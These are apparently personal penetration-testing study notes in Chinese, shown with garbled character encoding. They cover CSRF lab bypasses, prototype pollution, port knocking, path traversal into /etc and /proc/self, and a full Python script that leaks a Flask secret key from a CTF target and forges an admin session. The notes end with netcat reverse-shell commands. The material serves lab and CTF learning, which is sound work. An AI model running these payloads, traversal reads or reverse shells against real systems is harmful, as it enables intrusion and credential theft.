> æˆ‘ä»¬çš„ç»•è¿‡æ‰‹æ®µæ˜¯åŸºäº CSRF Token æˆ–åŒæºæ”¿ç­–å¹¶ä¸æ˜¯é‚£ä¹ˆä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œç”šè‡³æŸäº›æ—¶å€™ç”±äºè®¾è®¡çš„ç–å¿½äº§ç”Ÿçš„é€»è¾‘æ¼æ´ã€‚

è‹¥éç‰¹åˆ«æé†’ï¼Œä»¥ä¸‹æ‰€æœ‰é¶åœºçš„ä¸šåŠ¡ç‚¹å‡å¤„äº **"Update email"**ä¸‹ã€‚

### 1. å°† POST ä¿®æ”¹ä¸º GET è¯·æ±‚è¿›è¡Œç»•è¿‡

> é¶åœºåœ°å€ [Lab: CSRF where token validation depends on request method)](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)

**èƒŒåé€»è¾‘**ï¼š

CSRF Token åœ¨ POST è¯·æ±‚å½“ä¸­ç”Ÿæ•ˆï¼Œä¸”ä¸šåŠ¡ç‚¹å¹¶éå®Œå…¨é™åˆ¶è¯·æ±‚ä¸º POST è¯·æ±‚ï¼Œä»è€Œç»™äº†æ”»å‡»è€…è¿›è¡Œç»•è¿‡çš„æœºä¼šã€‚

æ¢æµ‹æ–¹æ³•ï¼šå°† CSRF Token åˆ æ‰ï¼Œå¹¶å°† HTTP è¯·æ±‚ä¿®æ”¹ä¸º GET è¯·æ±‚ã€‚

![image](https://image.3001.net/images/20220515/1652623705_628109597270d0f3b4daa.png!small)

æ­¤æ—¶çš„å›æ˜¾ä¸º`"Missing parameter 'csrf'"`ï¼Œæˆ‘ä»¬å†å°† HTTP è¯·æ±‚ä¿®æ”¹ä¸º GET è¯·æ±‚ï¼Œè§‚å¯Ÿå›æ˜¾ã€‚

![image](https://image.3001.net/images/20220515/1652623715_62810963106b1d98b7f3d.png!small)

å›æ˜¾ 302ï¼Œä»£è¡¨æˆ‘ä»¬å¯ä»¥ç”¨è¿™ç§æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œæ„é€  Payload

![image](https://image.3001.net/images/20220515/1652623723_6281096b1eb5d5c9e1f9d.png!small)

### 2. åˆ é™¤ CSRF Token è¿›è¡Œç»•è¿‡

> é¶åœºåœ°å€ [Lab: CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)

**èƒŒåé€»è¾‘**:

å¹¶æ²¡æœ‰å¼ºéªŒè¯ CSRF Token çš„å­˜åœ¨æ€§ã€‚

æˆ‘ä»¬å°è¯•åˆ é™¤ CSRF Tokenï¼Œå›æ˜¾ 302

![image](https://image.3001.net/images/20220515/1652623732_6281097426f5732a9897d.png!small)

åœ¨åˆ é™¤æ‰ CSRF Token ä¹‹åç”Ÿæˆ POC å³å¯ã€‚

### 3. CSRF Token æœªä¸ç”¨æˆ· Session ç»‘å®š

> é¶åœºåœ°å€ [Lab: CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)

èƒŒåé€»è¾‘

æœªè¿›è¡Œä¸¥æ ¼çš„ä¸€ä¸€èº«ä»½å¯¹åº”ï¼Œè¿™å…¶å®å¾ˆå¥½ç†è§£ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ç™»å½•æ³¨å†Œç•Œé¢ï¼Œå®é™…ä¸Šæ˜¯éœ€è¦å»åŒ¹é…ç”¨æˆ·åä¸å¯†ç æ˜¯å¦ç›¸ç­‰çš„ï¼Œè€Œè¿™é‡Œçš„é€»è¾‘ä¹Ÿæ˜¯ä¸€è‡´ã€‚

é‚£ä¹ˆè¿™é‡Œï¼Œæˆ‘å¯ä»¥å…ˆä¿®æ”¹ Cookieï¼Œå†ä¿®æ”¹ CSRF Tokenï¼Œæ¥è§‚å¯Ÿ CSRF Token ä¸ Cookie æ˜¯å¦å¯¹åº”äº†ï¼Œæˆ–è€…è¯´æ˜¯å¦ç»‘å®šäº†ã€‚

ä¿®æ”¹ Cookie ä¸­çš„ Session å€¼ï¼Œè§‚å¯Ÿå›æ˜¾ä¸º "Unauthorized"

![image](https://image.3001.net/images/20220515/1652623767_62810997abce6290fb65a.png!small)

ä¿®æ”¹ CSRF Tokenï¼Œè§‚å¯Ÿå›æ˜¾ä¸º "Invalid CSRF Token"

è¯´æ˜ CSRF Token å¹¶æœªä¸ session ç»‘å®šï¼Œè€Œæ˜¯ä¸ csrfKey(ä¹Ÿå°±æ˜¯ value) ç»‘å®šçš„ï¼Œæ ¹æ® cookie çš„ä¼ é€’æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä»–é¡µé¢æå‰æŠŠ csrfKey æ³¨å…¥è¿›å»ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨`img`ä¸`onerror`ç»„åˆçš„ XSS ä»¥åŠ CLRF æŠ€æœ¯æ¥æ„é€  CSRFã€‚

è¿™é‡Œå€Ÿç”¨æ¢¨å­å¸ˆå‚…çš„ Poc

![image](https://image.3001.net/images/20220515/1652623773_6281099dd3a7bf5f4fc25.png!small)

å½“å—å®³è€…ç‚¹å‡» CSRF é“¾æ¥æ—¶ä¼šå…ˆè§¦å‘ CLRF æ³¨å…¥ Set-Cookie å‚æ•°å€¼ï¼Œå°† csrfKey å€¼æ·»åŠ åˆ° Cookie ä¸­ï¼Œç„¶åå†ç”¨é™„æœ‰ä¸ csrfKey å¯¹åº”çš„ CSRF Token çš„è¯·æ±‚å»æäº¤ä¿®æ”¹é‚®ç®±è¯·æ±‚ã€‚

### 4. å½“ Cookie ä¸­çš„ CSRF å€¼ä¸ CSRF Token çš„å€¼ä¸€è‡´æ—¶

> é¶åœºåœ°å€ [Lab: CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)

èƒŒåé€»è¾‘ï¼š

åªæ˜¯å°† CSRF Token ç®€å•å¤åˆ¶åˆ° cookie å¤´ä¸­ï¼Œç„¶åä»…éªŒè¯ä¸¤è€…æ˜¯å¦ä¸€è‡´ã€‚

æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬çš„ç»•è¿‡ Poc çš„æ ¸å¿ƒéƒ¨åˆ†åº”è¯¥æ˜¯è¿™æ ·çš„,`%0d%0a`ä¸º`\r\n`ï¼Œä¹Ÿå°±æ˜¯ CR ä¸ LF

```
<img src="url/?search=test%0d%0aSet-Cookie:%20csrf=jVDOkLRjgEe41xJlURwUeAIcDet4Cier" onerror="document.forms[0].submit();"/>
```

![image](https://image.3001.net/images/20220515/1652623832_628109d8e9a0c5078f572.png!small)

### 5. å¯¹ä¸ä¸¥æ ¼çš„ Referer é™åˆ¶è¿›è¡Œç»•è¿‡

> é¶åœºåœ°å€ [Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

èƒŒåé€»è¾‘

å¹¶æ²¡æœ‰ç‰¹åˆ«ä¸¥æ ¼åœ°é™åˆ¶ Refererï¼Œä»…ä»…åªæ˜¯ä¸å…è®¸äº†è¿™ä¸€ç§çš„ Refererã€‚

```
Referer: é¶åœºåœ°å€.com

// ä¸‹é¢æ˜¯éæ³•çš„

Referer: baidu.com
```

ä¸€èˆ¬æˆ‘ä»¬é€šè¿‡`Referer: baidu.com`æ¥åˆ¤æ–­ Referer çš„é™åˆ¶ã€‚

è‹¥`Referer: baidu.com`è¢«é™åˆ¶ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼è¿›è¡Œç»•è¿‡

```
http://attacker-website.com/csrf-attack?baidu.com
```

é¶åœºéƒ¨åˆ†ï¼ŒåŒæ ·æ˜¯å¯¹æ›´æ”¹é‚®ç®±è¿™ä¸ªåŠŸèƒ½ç‚¹è¿›è¡Œ CSRF æ”»å‡»

è¿™é‡Œæˆ‘ä»¬éœ€è¦ä»‹ç»ä¸€ä¸‹`history.pushState`ï¼Œè¿™ä¸ªå‡½æ•°é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯æ’å…¥å†å²è®°å½•çš„ï¼Œæ‰€ä»¥è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆç¬¬ä¸‰ä¸ªå‚æ•°çš„å€¼ä¿®æ”¹ä¸ºä¸æ”»å‡»é“¾æ¥åŒæºåå³å¯ç»•è¿‡é”™è¯¯åœ° Referer å¤´éªŒè¯æœºåˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™æ ·æ„é€  CSRF é¡µé¢ã€‚

æˆ‘ä»¬å…ˆä¿®æ”¹ Referer ä¸º baidu.com æŸ¥çœ‹å›æ˜¾ï¼ŒæˆåŠŸå‘åŒ…ã€‚

![image](https://image.3001.net/images/20220515/1652623842_628109e2826ef6ac24a7a.png!small)

ä¿®æ”¹ Referer ä¸º`baidu.com+?laburl`ï¼Œå›æ˜¾ä¸º 302 æˆåŠŸã€‚

![image](https://image.3001.net/images/20220515/1652623851_628109eb2336fe9ed28cf.png!small)

æ„é€  Payloadï¼Œå°†`history.pushState`çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¿®æ”¹ä¸º Lab çš„ URL åœ°å€ã€‚æŠ•æ”¾ä¹‹åï¼Œåœ¨ Head å½“ä¸­æ·»åŠ `Referrer-Policy: unsafe-url`

![image](https://image.3001.net/images/20220515/1652623860_628109f4138d2f3afc38f.png!small)

### 0x07 å°ç»“

CSRF æ”»å‡»æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ç§é’“é±¼æ‰‹æ®µï¼Œæœ¬æ–‡ç€é‡è®²äº†ä¸€äº› CSRF æ”»å‡»çš„ç»•è¿‡æ‰‹æ³•ï¼Œè¯´ä¸å®šæ¸—é€çš„æ—¶å€™å¤šè¯•ä¸€è¯•å°±èƒ½èµ·åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚





## SSRF



## 6.æ–‡ä»¶ä¸Šä¼ æ¼æ´[ç»•è¿‡](https://blog.csdn.net/qq_55213436/article/details/126091664)





## 7.javaScriptåŸç”Ÿå‹æ±¡æŸ“æ¼æ´

[è¯¦ç»†](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs)

ä»€ä¹ˆæ˜¯åŸç”Ÿå‹æ±¡æŸ“ï¼Œé¦–å…ˆæˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒJavaScriptä¸­æˆ‘ä»¬éƒ½æœ‰ç±»ï¼Œobjectï¼Œæ¯”å¦‚è¯´

```
function F(){
}
è¿™ä¹Ÿæ˜¯ä¸€ä¸ªç±»
å½“ç„¶é€šå¸¸æ˜¯ä½¿ç”¨
class F(){
}
è¿˜æœ‰let a={}
è¿™æ˜¯ä¸€ä¸ªobjectçš„ç±»å¯¹è±¡
```

å…³äºå¯¹è±¡ï¼ˆobjectï¼‰ ä¸classçš„å…³ç³»ï¼Œä¹Ÿå°±æ˜¯çˆ¹ä¸å„¿å­ï¼Œä¸€ä¸ªå®ä¾‹åŒ–çš„å¯¹è±¡æ¥æºäºclass,å†æ¯”å–»ï¼ŒæŠŠclasså½“åšæ˜¯åŠ¨ç‰©ï¼Œç„¶ååŠ¨ç‰©å°±æœ‰ä¸€äº›ç‰¹å¾ï¼Œè¿™äº›ç‰¹å¾å°±æ˜¯classé‡Œé¢çš„å±æ€§ï¼›ç„¶åå®ä¾‹åŒ–ï¼Œå°±æ˜¯å°ç‹—ï¼Œå°ç‹—åŒ…å«äº†ä¸€äº›å±æ€§ï¼›

ç„¶åå›æ¥ï¼ŒåŸç”Ÿå‹æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯æŒ‡çš„æ˜¯class çš„åŸç”Ÿæ€ï¼Œæ¯”å¦‚ä¸Šé¢çš„ä¾‹å­æ‰€ä¸¾å‡ºæ¥çš„ï¼ŒFï¼Œ{} å°±æ˜¯åŸç”Ÿå‹ï¼Œè€Œå®ä¾‹åŒ–å‡ºæ¥çš„f= new F()   a={} åªæ˜¯å¯¹è±¡object



åœ¨ç±»çš„åŸç”Ÿå‹ä¸­ï¼Œæœ‰ä¸€ä¸ªé»˜è®¤çš„éšè—çš„å±æ€§ï¼Œprototypeï¼Œnewå‡ºæ¥çš„å®ä¾‹åŒ–å¯¹è±¡æœ‰æ²¡æœ‰å‘¢ï¼Ÿæœ‰ï¼Œå®ä¾‹åŒ–åçš„å¯¹è±¡çš„è¿™ä¸ªå±æ€§æ˜¯

```
__proto__

å‡å¦‚ f = new F()
é‚£ä¹ˆå°±æœ‰
f.__proto__ = F.prototype
```

ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹fçš„protoæ¥è¾¾åˆ°å¯¹Fçš„æ›´æ”¹ï¼Œè¿™å°±æ˜¯åŸç”Ÿå‹æ±¡æŸ“ï¼›



**å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´**ï¼Œ

é¦–å…ˆæ‰¾åˆ°èƒ½å¤Ÿä¿®æ”¹protoå±æ€§çš„å‡½æ•°ï¼Œä¸€èˆ¬æœ‰ merged è¿˜æœ‰

```
new=Object.assign({}, baseUser, user)
æ„æ€æ˜¯ï¼Œå°†userä¸baseUserè¿›è¡Œåˆå¹¶åˆ°{}å¾—åˆ°new;
```

ä¸€èˆ¬è¿™ä¸ªæ¼æ´å­˜åœ¨äºjsåç«¯ï¼Œå¯¹ä¼ å…¥çš„jsonæ•°æ®è¿›è¡Œjson.parseçš„æ—¶å€™ä¼šè§¦å‘æ±¡æŸ“

ä¸¾ä¾‹ï¼š

```js
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b) //è¾“å‡º2
```









# å°çŸ¥è¯†ç‚¹&æŠ€å·§

## 1.Linux ç”¨æˆ·é…ç½®æ–‡ä»¶ä¿¡æ¯/etc/passwd

  1ï¼‰å¯†ç åˆ™åœ¨/etc/shadowï¼Œroot ç”¨æˆ·çš„UIDå’ŒGIDéƒ½ä¸º0ï¼Œåè¿‡æ¥å¯ä»¥æ ¹æ®è¿™ä¸ªæˆä¸ºroot ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ·»åŠ ä¸€ä¸ªç”¨æˆ·åœ¨/etc/passwd é‡Œé¢çš„UID & GIDéƒ½æ˜¯0çš„è¯ï¼Œé‚£ä¹ˆå®ƒçš„**æƒé™å°±æ˜¯rootï¼Œå› æ­¤è¾¾åˆ°æƒé™æå‡**ï¼›

2ï¼‰shadowæ–‡ä»¶é‡Œé¢çš„å¯†ç æ˜¯åŠ ç›hashå­˜å‚¨çš„ï¼Œä»€ä¹ˆæ˜¯åŠ ç›ï¼Ÿshadowå†…å®¹çš„æ ¼å¼ï¼Ÿ[å‚è€ƒ](https://blog.csdn.net/Drifter_Galaxy/article/details/124334401?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166635617516800184198016%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166635617516800184198016&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124334401-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=%2Fetc%2Fshadow%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86&spm=1018.2226.3001.4187)

æ˜æ–‡å¯†ç æ˜¯ **passwd**ï¼Œ**salt** æ˜¯éšæœºå­—ä¸²

å‡è®¾**id**=1ï¼Œå³é€‰æ‹©**md5**å“ˆå¸Œç®—æ³•ã€‚

é‚£ä¹ˆåŠ ç›çš„è¿‡ç¨‹å°±æ˜¯ è®¡ç®— h a s h e d = m d 5 ( s a l t + p a s s w d ) hashed=md5(salt+passwd)hashed=md5(salt+passwd)

ç®—å‡ºæ¥ä¹‹åå°±æ˜¯å’±ä»¬åœ¨shadowæ–‡ä»¶é‡Œè¯»çš„ **$id$salt$hashed**äº†

## 2.ç«¯å£çŠ¶æ€ä¸ºfiltered  å°†å…¶è½¬ä¸ºopen

æŸäº›ç«¯å£çš„çŠ¶æ€æ˜¯"filtered"ï¼ŒçŒœæµ‹æ˜¯è¢«é˜²ç«å¢™è¿‡æ»¤äº†

å‡ºç°çš„é—®é¢˜åŠè§£å†³åŠæ³•ï¼š

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020204154228.png" alt="image-20221020204154228" style="zoom:50%;" />

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020204328847.png" alt="image-20221020204328847" style="zoom:50%;" />

å¦å¤–Linuxä¸Šè¿˜æœ‰ä¸€ç§æœåŠ¡ï¼Œknockd å¯ä»¥éšè—ç«¯å£ï¼Œå½“nmapæ—¶ç«¯å£çŠ¶æ€å¯èƒ½å°±æ˜¯filtered :

æ¯”å¦‚22ç«¯å£å¯ä»¥é€šè¿‡knockdéšè—ï¼ŒæŸ¥çœ‹`/etc/knockd.conf`é‡Œé¢çš„æ•²å‡»ç«¯å£ï¼Œå¯ä»¥å®ç°éšè—å’Œæ‰“å¼€ç«¯å£ï¼›[å‚è€ƒ](https://blog.csdn.net/shuteer_xu/article/details/113210793?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166626998916800182743771%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166626998916800182743771&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113210793-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=knockd%E9%9A%90%E8%97%8Fssh&spm=1018.2226.3001.4187)

é…ç½®è§£é‡Šå¦‚ä¸‹ï¼š

``[options]`
`UseSyslog //ç”¨æ¥å®šä¹‰æ—¥å¿—è¾“å‡ºä½ç½®ä»¥åŠæ–‡ä»¶å`

`[openSSH]`
`sequence = 7000,8000,9000 //è®¾ç½®ï¼ˆå¼€é—¨ï¼‰æ•²é—¨é¡ºåºï¼Œå¯ä»¥è‡ªå®šä¹‰`
`seq_timeout = 5 //è®¾ç½®è¶…æ—¶æ—¶é—´`
`command = /sbin/iptables â€A INPUT â€s %IP% â€p tcp â€â€dport 22 â€j ACCEPT //å¼€é—¨æˆåŠŸåæ·»åŠ é˜²ç«å¢™è§„åˆ™å‘½ä»¤ï¼ˆæ‰“å¼€SSHç«¯å£ï¼‰`
`tcpflags = syn`

`[closeSSH]`
`sequence = 9000,8000,7000 //è®¾ç½®ï¼ˆå…³é—¨ï¼‰æ•²é—¨é¡ºåºï¼Œä¸å¼€é—¨é¡ºåºç›¸å`
`seq_timeout = 5 //è®¾ç½®è¶…æ—¶æ—¶é—´`
`command = /sbin/iptables â€D INPUT â€s %IP% â€p tcp â€â€dport 22 â€j ACCEPT //å…³é—¨æˆåŠŸååˆ é™¤ä¹‹å‰æ·»åŠ çš„é˜²ç«å¢™è§„åˆ™ï¼ˆå…³é—­SSHç«¯å£ï¼‰`
`tcpflags = syn`

**æ¸—é€ä¸¾ä¾‹ï¼šDC-9ï¼š**

![image-20221020205537302](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020205537302.png)

å½“ä½¿ç”¨ä¹å¤´è›‡ç ´è§£ä¸»æœºçš„sshæ—¶ï¼Œæ‹’ç»è¿æ¥ï¼Œnmap å‘ç°22æ˜¯filtered çŠ¶æ€ã€‚æœ‰å¯èƒ½å°±æ˜¯é‡‡ç”¨äº†knockdçš„æœåŠ¡è¿›è¡Œäº†éšè—ï¼Œé‚£ä¹ˆç»“åˆä¹‹å‰çš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨`/etc/knockd.conf`æ–‡ä»¶

è®¿é—® http://172.16.12.161/manage.php?file=../../../../etc/knockd.conf

![image-20221020210004819](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020210004819.png)

çœ‹åˆ°æ•²å‡»ç«¯å£ä¸º7469 8475 9842

ä½¿ç”¨nc 172.16.12.161 7469 æˆ–è€…nmap -p 7469 172.16.12.161ä¸¤ç§æ–¹å¼æ•²å‡»ç«¯å£ï¼Œåªè¦æ˜¯ä¸ç«¯å£å»ºç«‹è¿æ¥çš„å‘½ä»¤éƒ½å¯ä»¥

ä¾æ¬¡æ•²å‡»ä¸‰ä¸ªç«¯å£å°±å¯ä»¥å¼€å¯ssh çŠ¶æ€ä¸ºopen

## 3.[/procç›®å½•](https://blog.csdn.net/Zero_Adam/article/details/114853022)

æˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥é€šè¿‡`/proc/$pid/`æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œ[linux](https://so.csdn.net/so/search?q=linux&spm=1001.2101.3001.7020)æä¾›äº†`/proc/self/`ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº`/proc/æœ¬è¿›ç¨‹pid/`ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®`/proc/self/`ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚



../../../../proc/self/cmdline  è·å–å½“å‰è¿›ç¨‹çš„è¿è¡Œè¿‡çš„å‘½ä»¤ï¼Œä¾‹å¦‚ python app.pyï¼Œä¾¿å¯å¾—åˆ°è¿è¡Œçš„æ–‡ä»¶ä¸ºapp.py

../../../../proc/self/environ   è·å–å½“å‰è¿›ç¨‹è¿è¡Œçš„ç¯å¢ƒï¼›

../../../../proc/self/exe  è·å–å¯æ‰§è¡Œæ–‡ä»¶**çš„**å®Œæ•´è·¯å¾„**

**../../../../proc/self/fd**  è·å–**å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶**çš„è·¯å¾„æè¿°ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡**fd**ç›®å½•çš„æ–‡ä»¶è·å–è¿›ç¨‹ï¼Œä»è€Œæ‰“å¼€æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹ã€‚

ä¾‹å¦‚**../../../../proc/self/fd**/1 ä¾¿å¯æ‰“å¼€è¿›ç¨‹1çš„æ–‡ä»¶å†…å®¹ï¼Œå°±ç®—è¿™ä¸ªæ–‡ä»¶è¢«åˆ é™¤ï¼Œè¿™é‡Œä¹Ÿæœ‰æ˜¾ç¤ºï¼›

[CTF ä¾‹é¢˜](https://blog.csdn.net/Zero_Adam/article/details/114890384)

**è¿™ä¸ªfdæ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¦‚æœä¸€ä¸ªç¨‹åºç”¨ open() æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æœ€ç»ˆæ²¡æœ‰å…³é—­å®ƒï¼Œå³ä½¿ä»å¤–éƒ¨ï¼ˆå¦‚ï¼šos.remove(SECRET_FILE))åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨`/proc`è¿™ä¸ªè¿›ç¨‹çš„ `pid`ç›®å½•ä¸‹çš„`fd`æ–‡ä»¶æè¿°ç¬¦ ç›®å½•ä¸‹ è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯ä»¥å¾—åˆ°è¢«åˆ é™¤çš„æ–‡ä»¶çš„å†…å®¹**

/proc/self/mapså¯ä»¥å¾—åˆ°å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œé€šè¿‡è¯»è¯¥æ–‡ä»¶çš„å†…å®¹å¯ä»¥å¾—åˆ°å†…å­˜ä»£ç æ®µåŸºå€ã€‚

/proc/self/memæ˜¯è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œé€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜ã€‚

ä¾‹é¢˜ï¼š[æ”»é˜²ä¸–ç•Œcatcat-new](https://adworld.xctf.org.cn/challenges/write-up?hash=9cc7514c-7c47-11ed-ab28-000c29bc20bf&task_category_id=3)

ä½¿ç”¨/proc/self/mapså¾—åˆ°å†…å­˜æ˜ å°„ï¼š55a7c2545000-55a7c2546000 rw

å¾—åˆ°è¿™ä¸ªå¯ä»¥ä½¿ç”¨ 

```
map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
```

æ¥åŒ¹é…ï¼›

ç„¶åå†å°†16è¿›åˆ¶è½¬æ¢ä¸º10è¿›åˆ¶

```
start = int(map_addr.group(1), 16)
end = int(map_addr.group(2), 16)
```

å†é…åˆmemæ¥è·å–å†…å®¹

```
?file=../../../proc/self/mem&start={start}&end={end}
```

åˆ—é¢˜å®Œæ•´ä»£ç ï¼š

```python

import requests
import re
import ast, sys
from abc import ABC
from flask.sessions import SecureCookieSessionInterface


url = "http://61.147.171.105:60014/"

#æ­¤ç¨‹åºåªèƒ½è¿è¡ŒäºPython3ä»¥ä¸Š
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')

#----------------session ä¼ªé€ ,å•ç‹¬ç”¨ä¹Ÿå¯ä»¥è€ƒè™‘è¿™ä¸ªåº“ï¼š https://github.com/noraj/flask-session-cookie-manager ----------------
class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key
        
class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            #Encode a Flask session cookie
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e
#-------------------------------------------



#ç”±/proc/self/mapsè·å–å¯è¯»å†™çš„å†…å­˜åœ°å€ï¼Œå†æ ¹æ®è¿™äº›åœ°å€è¯»å–/proc/self/memæ¥è·å–secret key
s_key = ""
bypass = "../.."
#è¯·æ±‚fileè·¯ç”±è¿›è¡Œè¯»å–
map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")
for i in map_list:
    #åŒ¹é…æŒ‡å®šæ ¼å¼çš„åœ°å€
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print("Found rw addr:", start, "-", end)
        
        #è®¾ç½®èµ·å§‹å’Œç»“æŸä½ç½®å¹¶è¯»å–/proc/self/mem
        res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
        #ç”¨åˆ°äº†ä¹‹å‰ç‰¹å®šçš„SECRET_KEYæ ¼å¼ã€‚å¦‚æœå‘ç°*abcdefghå­˜åœ¨å…¶ä¸­ï¼Œè¯´æ˜æˆåŠŸæ³„éœ²secretkey
        if "*abcdefgh" in res.text:
            #æ­£åˆ™åŒ¹é…ï¼Œæœ¬é¢˜secret keyæ ¼å¼ä¸º32ä¸ªå°å†™å­—æ¯æˆ–æ•°å­—ï¼Œå†åŠ ä¸Š*abcdefgh
            secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
            if secret_key:
                print("Secret Key:", secret_key[0])
                s_key = secret_key[0]
                break

#è®¾ç½®sessionä¸­adminçš„å€¼ä¸º1
data = '{"admin":1}'
#ä¼ªé€ session
headers = {
    "Cookie" : "session=" + FSCM.encode(s_key, data)
}
#è¯·æ±‚adminè·¯ç”±
try:
    flag = requests.get(url + "admin", headers=headers)
    print("Flag is", flag.text)
except:
    print("Something error")
```





## 4.[åå¼¹shell](https://xz.aliyun.com/t/9488)

https://xz.aliyun.com/t/9488

### 1.ncåå¼¹shell

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
netcat -lvvp 2333
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
netcat 47.xxx.xxx.72 2333 -e /bin/bash
# nc <æ”»å‡»æœºIP> <æ”»å‡»æœºç›‘å¬çš„ç«¯å£> -e /bin/bash
```

### 2.bashåå¼¹

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
nc -lvvp 2333
```

